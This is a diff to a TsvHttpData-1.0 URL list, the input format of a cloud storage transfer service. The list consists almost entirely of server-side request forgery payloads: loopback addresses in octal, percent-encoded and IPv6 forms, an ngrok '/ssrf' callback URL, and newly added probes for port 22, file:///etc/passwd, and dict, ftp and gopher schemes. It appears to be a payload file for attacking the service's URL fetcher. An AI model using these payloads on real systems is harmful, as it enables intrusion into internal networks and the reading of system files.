@@ -1,4 +1,6 @@
 TsvHttpData-1.0
+http://0.0.0.0:22/      1357      A+HvTjBeDmzIES/+siF8vA==
+http://0.0.0.0:22/
 https://127.0.0.1/      1357      A+HvTjBeDmzIES/+siF8vA==
 https://[::]/      2468      A+HvTjBeDmzIES/+siF8vA==
 https://0000::1/      2468      A+HvTjBeDmzIES/+siF8vA==
@@ -16,3 +18,13 @@ http://0177.0.0.01      2468      A+HvTjBeDmzIES/+siF8vA==
 https://%6c%6f%63%61%6c%68%6f%73%74/     2468      A+HvTjBeDmzIES/+siF8vA==
 https://9470d358.ngrok.io/ssrf      2468      A+HvTjBeDmzIES/+siF8vA==
 https://example.com/buckets/obj2      2468      A+HvTjBeDmzIES/+siF8vA==
+file:///etc/passwd      2468      A+HvTjBeDmzIES/+siF8vA==
+file:///etc/passwd
+dict://
+ftp://
+gopher://
+dict://0      2468      A+HvTjBeDmzIES/+siF8vA==
+ftp://0      2468      A+HvTjBeDmzIES/+siF8vA==
+gopher://0      2468      A+HvTjBeDmzIES/+siF8vA==
+
+      
